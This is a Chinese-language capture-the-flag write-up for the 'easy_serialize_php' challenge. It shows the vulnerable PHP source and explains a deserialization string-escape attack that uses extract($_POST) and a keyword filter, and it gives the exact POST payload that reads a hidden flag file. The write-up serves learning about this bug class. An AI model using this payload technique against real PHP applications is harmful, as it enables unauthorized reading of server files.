easy_serialize_php

文笔垃圾，内容肤浅，毫无营养。

题目地址：https://buuoj.cn/

打开题目会有source_code，点击会将页面源码打印出来：

<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function; //此处的function 由f传来的参数赋值

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}

0.0 解释函数

extract() php函数，作用是将数组键名作为变量名，使用数组键值作为变量值，返回值成功设置的变量数目。简单来说就是可以覆盖或者创建变量。

serialize() php函数，作用是将数组或者对象转化成字符串，返回值为字符串，便于传递。

implode() php函数，作用是将数组中的元素中间添加字符组成新的字符串，返回值是新的字符串。

0.1分析源码

看到38行的unserialize函数和39行的file_get_contents函数，大概可以锁定这道题目是通过反序列化读取文件。而反序列化的内容是**$serialize_info**，向上找一下$serialize_info是个什么，分析如下

$serialize_info = filter(serialize($_SESSION)); //可以看到serialize_info是序列化了$_SESSION这个超全局变量,然后对序列化的内容进行了过滤
//filter的定义如下
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
//大概意思是将php、flag、php5、php4、fl1g(不区分大小写，意思就是你大写也会被替换为空)替换为空

看到这里，很多有经验的师傅已经知道，这里存在php反序列化字符串逃逸漏洞，我们还需要知道我们可以输入的点在哪里，再往上找，看到extract($_POST);，这行代码可以覆盖变量，或者添加变量，我们可以向$_SESSION数组中添加键值对，或者修改键值对。

**file_get_contents(base64_decode($userinfo[‘img’]))**这里很明显是输出$userinfo[‘img’]里面所指的文件。上面已经分析$userinfo[‘img’]是序列化$_SESSION得来的，所以我们需要逃逸的key:value已经很明确了，就是img:base64-encode(flag的地址)。

但是flag在哪呢？访问flag.php不存在，再看源码中有一个phpinfo，访问/index.php?f=phpinfo

0.2 php反序列化逃逸

这里是将关键字替换为空，举一个例子，假设

<?php

$user_info = array(
	"username"=>$_POST['username'],
	"password"=>$_POST['password']
);

echo serialize($user_info);
?>

输出结果为

a:2:{s:8:"username";s:23:"admin1admin1admin1admin";s:8:"password";s:26:"";s:8:password;s:3:"123";}";}

假如我有一个替换函数，是将admin1和admin替换为空，那么返回的字符串为

a:2:{s:8:"username";s:23:"";s:8:"password";s:26:"";s:8:"password";s:3:"123";}";}
//";s:8:"password";s:26:" 这段字符串长度为23，反序列化时，会被认为是username的值，而逃逸出后面的字符

我们将这段代码反序列化一下：

<?php
$info ='a:2:{s:8:"username";s:23:"";s:8:"password";s:26:"";s:8:"password";s:3:"123";}";}';     
$user = unserialize($info);
echo $user['password'];
?>

在这里user的值我们内容可控，我们需要将 “;s:8:“function”;s:14:” 这个值赋给user，一共23个字符，所以构造user=flagflagphpphpphpphpphp

以为读取文件时进行了base64解码，所以我们要将d0g3_f1ag.php进行 base64编码：ZDBnM19mMWFnLnBocA==

访问index.php?f=show_image，然后构造post数据为：

_SESSION[user]=flagflagphpphpphpphpphp&_SESSION[function]=";s:3:“img”;s:20:“ZDBnM19mMWFnLnBocA==”;s:1:“b”;s:1:“a”;}

s:1:“b”;s:1:“a”; 添加这个数据是因为a:3:{}表示这个数组里有三个键值对，我们在闭合前必须保证数据内的键值对数目等于3，所以添加一组，这样数组里有键值：user，img，b

s表示字符串，1表示字符长度为1，“b” 为字符内容
